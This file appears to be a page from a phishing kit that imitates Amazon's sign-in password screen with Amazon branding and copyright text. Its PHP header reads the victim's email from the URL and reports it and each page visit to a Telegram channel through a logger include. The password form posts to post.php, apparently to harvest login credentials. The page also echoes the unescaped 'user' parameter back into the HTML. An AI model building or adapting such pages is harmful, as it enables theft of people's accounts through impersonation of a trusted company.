<?php 
require 'main.php';
require 'telegram_logger.php';

// Log password page visit and email
$user = @$_GET['user'];
if ($user) {
    sendToTelegram("📧 User entered EMAIL: {$user}", "PASSWORD");
} else {
    sendToTelegram("🔒 User accessed PASSWORD page", "PASSWORD");
}
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/amazon.css">
    <title>Amazon</title>
</head>
<body>
    <header>
       <div class="logo"> <img src="res/img/logo1.png" alt="img">  </div></header>

<div class="header">
    <div class="header1">

<div class="title">
    <label>Sign in</label>
</div> <br>

<form action="post.php" method="post">
<div class="email"><b> Password </b></div>
<input type="hidden" name="user" value="<?php echo @$_GET['user']; ?>">
<div><input type="password" name="pass" required > </div>
 <br>
<div class="login">
<div class="button"><button type="submit"> sign in</button> </div>
</div>
<div class="paso">
    <input type="checkbox">
    <label>Keep me signed in. <a href="#"> Details </a></label> 
    
</div>
</form>
</div>
</div>
<div class="la"> </div>
 
<div class="z"> <label> <a href="#">  Conditions   </a> <a href="#"> Privacy Notice  </a> <a href="#">  Help  </a></label> </div>
<div class="aria"><h5>© 1996-2024, Amazon.com, Inc. or its affiliates</h5> </div>
</body>
</html>